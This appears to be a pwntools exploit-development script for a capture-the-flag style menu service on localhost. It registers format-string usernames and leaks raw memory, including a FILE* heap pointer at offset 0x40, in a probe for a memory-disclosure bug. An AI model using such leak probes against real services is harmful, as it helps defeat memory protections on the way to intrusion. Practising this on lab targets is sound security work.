#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'warn'

r = remote('127.0.0.1', 16767)

# Register with a VERY simple format string - just 4 bytes
# Simple format to check: what does read() actually store?
test_username = b'ABCD'
print(f"Registering with: {test_username}")

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'username: ', test_username)
line = r.recvline()
s0 = int(line.split(b'slot ')[1].split()[0])

for i in range(1, 4):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'username: ', b'YYY')
    r.recvline()

# Show slot 0
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'slot: ', b'0')
r.recvuntil(b'username: ')

# Get format output first
fmt_out = r.recvline()
print(f"Format output: {fmt_out}")

# Get raw 0x48 bytes
raw = r.recv(0x48)
print(f"\nRaw data ({len(raw)} bytes):")
for i in range(0, min(0x20, len(raw)), 1):
    c = raw[i]
    if 0x20 <= c < 0x7f:
        print(f"  [{i:3d}] = 0x{c:02x} ({chr(c)})")
    else:
        print(f"  [{i:3d}] = 0x{c:02x}")

if len(raw) >= 0x40:
    file_ptr = u64(raw[0x40:0x48])
    print(f"\nFILE* at offset 0x40: {hex(file_ptr)}")
    # Check if it's a valid heap address
    print(f"  High bits: {hex(file_ptr >> 40)}")

# Also test: what if the \n from sendline gets into the buffer?
# Try sending WITHOUT \n
print("\n\n=== Test 2: Send without trailing \\n ===")
r2 = remote('127.0.0.1', 16767)
r2.sendlineafter(b'> ', b'1')
# Use send() instead of sendlineafter to avoid extra \n
r2.recvuntil(b'username: ')
r2.send(test_username)  # no \n!
import time
time.sleep(0.2)
line = r2.recvline()
s0_2 = int(line.split(b'slot ')[1].split()[0])

for i in range(1, 4):
    r2.sendlineafter(b'> ', b'1')
    r2.sendlineafter(b'username: ', b'YYY')
    r2.recvline()

r2.sendlineafter(b'> ', b'2')
r2.sendlineafter(b'slot: ', b'0')
r2.recvuntil(b'username: ')
fmt2 = r2.recvline()
print(f"Format output: {fmt2}")
raw2 = r2.recv(0x48)
print(f"First 16 bytes raw: {raw2[:16].hex()}")

# Check what's at offset 0x40 for the file ptr
file_ptr2 = u64(raw2[0x40:0x48])
print(f"FILE*: {hex(file_ptr2)}")

r.close()
r2.close()
